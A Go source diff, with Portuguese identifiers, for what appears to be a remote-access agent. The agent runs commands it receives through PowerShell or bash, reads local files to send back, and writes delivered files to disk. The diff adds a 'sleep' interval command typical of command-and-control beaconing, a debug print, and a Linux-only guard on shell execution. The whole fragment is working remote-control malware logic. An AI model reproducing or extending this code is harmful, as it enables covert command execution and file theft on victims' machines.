@@ -14,6 +14,8 @@ import (
 	"os/exec"
 	"os/user"
 	"runtime"
+	"strconv"
+	"strings"
 	"time"
 
 	"github.com/mitchellh/go-ps"
@@ -78,7 +80,9 @@ func executaComando(comando string, indice int) (resposta string) {
 	case "send":
 		resposta = salvaArquivoEmDisco(mensagem.Comandos[indice].Arquivo)
 	case "get":
-		resposta = enviarArquivo(mensagem.Comandos[indice].Comando, indice)	
+		resposta = enviarArquivo(mensagem.Comandos[indice].Comando, indice)
+	case "sleep":
+		tempoEspera, _ = strconv.Atoi(strings.TrimSpace(comandoSeparado[1]))
 	default:
 		resposta = executaComandoEmShell(comando)
 	}
@@ -89,8 +93,8 @@ func executaComando(comando string, indice int) (resposta string) {
 func enviarArquivo(comandoGet string, indice int) (resposta string) {
 	var err error
 	resposta = "Arquivo enviado com sucesso."
-	comandoSeparado := helpers.SeparaComando(comandoGet)	
-
+	comandoSeparado := helpers.SeparaComando(comandoGet)
+	fmt.Println("comandoSeparado:", comandoSeparado[1])
 	mensagem.Comandos[indice].Arquivo.Conteudo, err = ioutil.ReadFile(comandoSeparado[1])
 	if err != nil {
 		resposta = "Erro ao copiar o arquivo: " + err.Error()
@@ -118,8 +122,11 @@ func executaComandoEmShell(comandoCompleto string) (resposta string) {
 		output, _ := exec.Command("powershell.exe", "/C", comandoCompleto).CombinedOutput()
 		resposta = string(output)
 	} else {
-		output, _ := exec.Command("/bin/bash", "-c", comandoCompleto).CombinedOutput()
-		resposta = string(output)
+		if (runtime.GOOS) == "linux" {
+			output, _ := exec.Command("/bin/bash", "-c", comandoCompleto).CombinedOutput()
+			resposta = string(output)
+		}
+		// Linha nula
 	}
 	return resposta
 
